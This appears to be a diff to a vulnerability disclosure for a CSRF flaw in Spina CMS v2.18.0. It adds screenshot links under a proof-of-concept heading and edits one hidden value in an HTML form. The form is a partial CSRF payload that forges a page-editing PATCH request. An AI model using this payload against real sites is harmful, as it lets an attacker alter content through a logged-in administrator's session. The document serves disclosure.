@@ -27,6 +27,12 @@ Spina CMS v2.18.0 was discovered to contain a Cross-Site Request Forgery (CSRF) 
 
  ------------------------------------------
  [POC]
+ <img width="1340" alt="图片" src="https://github.com/user-attachments/assets/33f37070-4a0a-4dfc-963c-f346a668619f">
+ <img width="612" alt="图片" src="https://github.com/user-attachments/assets/3b120878-77ae-4386-830c-590871ce17bf">
+ <img width="1248" alt="图片" src="https://github.com/user-attachments/assets/5343aefc-2ca5-4173-8511-da69885d9cb1">
+
+
+
 
 ```
 <html>
@@ -37,7 +43,7 @@ Spina CMS v2.18.0 was discovered to contain a Cross-Site Request Forgery (CSRF) 
       <input type="hidden" name="&#95;method" value="patch" />
       <input type="hidden" name="authenticity&#95;token" value="2&#47;DQq&#47;lFTWeAVeF6p1aSUpFLnmtWSViRJnQR&#43;BHHzvpyKPY2dZRdeaPsGcZClB4mU1tmpCLmLlPJKEWAkHlLyg&#61;&#61;" />
       <input type="hidden" name="locale" value="en" />
-      <input type="hidden" name="page&#91;title&#93;" value="Dudefac111e" />
+      <input type="hidden" name="page&#91;title&#93;" value="Dudeface12" />
       <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Repeater" />
       <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="repeater" />
       <input type="hidden" name="page&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Repeater" />
